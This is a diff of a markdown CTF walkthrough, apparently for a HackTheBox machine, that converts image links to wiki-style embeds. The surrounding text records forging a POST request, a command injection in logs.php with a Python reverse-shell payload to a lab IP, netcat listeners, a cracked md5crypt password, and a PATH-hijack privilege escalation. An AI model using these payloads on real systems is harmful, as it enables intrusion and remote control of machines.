@@ -141,55 +141,55 @@ status.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]
 
 ## Initial Access
 
-![37127d4428d48bc9c23421537088b456.png](../../_resources/37127d4428d48bc9c23421537088b456-1.png)
+![[37127d4428d48bc9c23421537088b456-1.png]]
 
-![e2f3cc7aec5006367c530617ba065b30.png](../../_resources/e2f3cc7aec5006367c530617ba065b30-1.png)
+![[e2f3cc7aec5006367c530617ba065b30-1.png]]
 
-![b0ddf17ac0146661d4991fa33ce2dca2.png](../../_resources/b0ddf17ac0146661d4991fa33ce2dca2-1.png)
+![[b0ddf17ac0146661d4991fa33ce2dca2-1.png]]
 
-![a776905d3356b3effd9fb80930781bb6.png](../../_resources/a776905d3356b3effd9fb80930781bb6-1.png)
+![[a776905d3356b3effd9fb80930781bb6-1.png]]
 
-![2dfdefec4158e0f83ccd1cfb13e57689.png](../../_resources/2dfdefec4158e0f83ccd1cfb13e57689-1.png)
+![[2dfdefec4158e0f83ccd1cfb13e57689-1.png]]
 
-![9580fe670bd140450c7f02bdc5756572.png](../../_resources/9580fe670bd140450c7f02bdc5756572-1.png)
+![[9580fe670bd140450c7f02bdc5756572-1.png]]
 
-![e9e6631ceb1a7fbbe1ebd124b5befee2.png](../../_resources/e9e6631ceb1a7fbbe1ebd124b5befee2-1.png)
+![[e9e6631ceb1a7fbbe1ebd124b5befee2-1.png]]
 
-![982f05e5ea6b2f1ccb90a28d999691f0.png](../../_resources/982f05e5ea6b2f1ccb90a28d999691f0-1.png)
+![[982f05e5ea6b2f1ccb90a28d999691f0-1.png]]
 
 ### Forging a POST request to add a user
 
 - Note: need to specify Content-Type for the parameters to be processed correctly. Make sure there is no newline at the end of the request.
 
-![8d5d4818bcfb439f8d720aef1098894c.png](../../_resources/8d5d4818bcfb439f8d720aef1098894c-1.png)
+![[8d5d4818bcfb439f8d720aef1098894c-1.png]]
 
-![599709d27428e5c24f2c83bad590a186.png](../../_resources/599709d27428e5c24f2c83bad590a186-1.png)
+![[599709d27428e5c24f2c83bad590a186-1.png]]
 
-![8d4c0d9bc3bc968f7ca4f1f11a1bf197.png](../../_resources/8d4c0d9bc3bc968f7ca4f1f11a1bf197-1.png)
+![[8d4c0d9bc3bc968f7ca4f1f11a1bf197-1.png]]
 
 ### Webapp exfiltration and analysis
 
-![668ccc50004f45766645f5ede6b636ed.png](../../_resources/668ccc50004f45766645f5ede6b636ed-1.png)
+![[668ccc50004f45766645f5ede6b636ed-1.png]]
 
-![9aa967a43495286e2e3e7c27caeaaef1.png](../../_resources/9aa967a43495286e2e3e7c27caeaaef1-1.png)
+![[9aa967a43495286e2e3e7c27caeaaef1-1.png]]
 
 - `out.log` contents
 
-![ea183b914ed1164bc9047d039ae47c31.png](../../_resources/ea183b914ed1164bc9047d039ae47c31-1.png)
+![[ea183b914ed1164bc9047d039ae47c31-1.png]]
 
 - `config.php` contents
 
-![2fc6caca5153e799de209245dde11b01.png](../../_resources/2fc6caca5153e799de209245dde11b01-1.png)
+![[2fc6caca5153e799de209245dde11b01-1.png]]
 
 - `logs.php` contents
 
-![92d174d30515413eabb1cb112ff50f6a.png](../../_resources/92d174d30515413eabb1cb112ff50f6a-1.png)
+![[92d174d30515413eabb1cb112ff50f6a-1.png]]
 
 ### Code injection in logs.php for shell
 
 - Quick note: At this point, I had to restart Kali and the VPN interface IP changed from 10.10.14.3 to 10.10.14.14, but the methods are the same...
 
-![4cb78902713e56875d00174fe02f1437.png](../../_resources/4cb78902713e56875d00174fe02f1437-1.png)
+![[4cb78902713e56875d00174fe02f1437-1.png]]
 
 - Started netcat listener
 
@@ -197,17 +197,17 @@ status.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]
 rlwrap nc -nvlp 1337 
 ```
 
-![3c711deba05f70a88c6485b4f8f3af41.png](../../_resources/3c711deba05f70a88c6485b4f8f3af41-1.png)
+![[3c711deba05f70a88c6485b4f8f3af41-1.png]]
 
 ```
 delim=;/usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
-![674768565a3e3495173b95b6becb3c43.png](../../_resources/674768565a3e3495173b95b6becb3c43-1.png)
+![[674768565a3e3495173b95b6becb3c43-1.png]]
 
 ### Escalating privileges by extracting and cracking md5crypt hashes
 
-![77dd2aaa1bb74be704f20a6630e0b982.png](../../_resources/77dd2aaa1bb74be704f20a6630e0b982-1.png)
+![[77dd2aaa1bb74be704f20a6630e0b982-1.png]]
 
 
 - Note: KEEP the salt shaker symbol!!
@@ -226,7 +226,7 @@ $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
 
 - User flag done!
 
-![6e5274ba3ae8e8f7e78fdbf353bf0e9f.png](../../_resources/6e5274ba3ae8e8f7e78fdbf353bf0e9f-1.png)
+![[6e5274ba3ae8e8f7e78fdbf353bf0e9f-1.png]]
 
 
 
@@ -234,9 +234,9 @@ $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
 
 ### Exploiting PATH injection for root
 
-![1440a3ce61113fea783b4ae9a4966c4e.png](../../_resources/1440a3ce61113fea783b4ae9a4966c4e-1.png)
+![[1440a3ce61113fea783b4ae9a4966c4e-1.png]]
 
-![6e844e58a3110feecb6d0a622ff23681.png](../../_resources/6e844e58a3110feecb6d0a622ff23681-1.png)
+![[6e844e58a3110feecb6d0a622ff23681-1.png]]
 
 ```
 rlwrap nc -nvlp 31337
@@ -250,4 +250,4 @@ export PATH=$(pwd):$PATH
 sudo /opt/scripts/access_backup.sh 
 ```
 
-![d530b3bc8cebbf7781c0c0f11d7e1211.png](../../_resources/d530b3bc8cebbf7781c0c0f11d7e1211-1.png)
+![[d530b3bc8cebbf7781c0c0f11d7e1211-1.png]]
